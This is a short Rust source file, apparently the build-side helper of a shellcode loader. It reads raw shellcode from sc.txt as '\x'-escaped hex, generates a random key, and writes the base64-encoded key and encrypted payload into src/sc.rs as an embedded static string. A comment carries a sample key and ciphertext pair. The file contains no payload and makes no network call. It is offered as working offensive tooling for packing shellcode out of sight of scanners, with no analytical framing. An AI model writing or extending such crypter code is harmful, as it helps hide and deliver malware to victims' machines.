use base64::prelude::*;
pub fn g_key(len: usize) -> Vec<u8> {
    let mut key = Vec::new();
    for _ in 0..len {
        key.push(rand::random());
    }
    key
}

pub fn p_out(key: &[u8], encrypted: &[u8]) -> (String, String) {
    let base64ed_key = BASE64_STANDARD.encode(key);
    let base64ed_encrypted = BASE64_STANDARD.encode(encrypted);
    let ksc = format!(
        "pub static KSC: &'static str = \"{}:{}\";",
        base64ed_key, base64ed_encrypted
    );
    let cwd = std::env::current_dir().unwrap();
    let out_path = cwd.join("src").join("sc.rs");
    std::fs::write(out_path, ksc).unwrap();
    (base64ed_key, base64ed_encrypted)
}

pub fn p_in(p: &str) -> (Vec<u8>, Vec<u8>) {
    // j8qPS26eT6kNfZ1IP5MpLQ==:cyIAS26eL5jf9HgstMEZpt3GBBl6r7Cmuje7w027
    let mut parts = p.split(':');
    let base64ed_key = parts.next().unwrap();
    let base64ed_encrypted = parts.next().unwrap();
    let key = BASE64_STANDARD.decode(base64ed_key.as_bytes()).unwrap();
    let encrypted = BASE64_STANDARD
        .decode(base64ed_encrypted.as_bytes())
        .unwrap();
    (key, encrypted)
}

pub fn r2sc() -> Vec<u8> {
    // sc.txt
    let cwd = std::env::current_dir().unwrap();
    // read sc.txt to string
    let sc_path = cwd.join("sc.txt");
    // sc exist
    let sc_str = std::fs::read_to_string(sc_path).unwrap();
    let hex_string = sc_str
        .replace(r"\x", "")
        .replace(|c: char| !c.is_ascii_hexdigit(), "");

    // 确保长度是偶数，否则最后一个字节会不完整
    if hex_string.len() % 2 != 0 {
        eprintln!("Invalid hex string length.");
        std::process::exit(1);
    }

    // 将十六进制字符串转换为字节数组
    let shellcode: Vec<u8> = hex_string
        .as_bytes()
        .chunks(2)
        .map(|chunk| {
            let hex_pair = String::from_utf8_lossy(chunk);
            u8::from_str_radix(&hex_pair, 16).unwrap()
        })
        .collect();

    shellcode
}
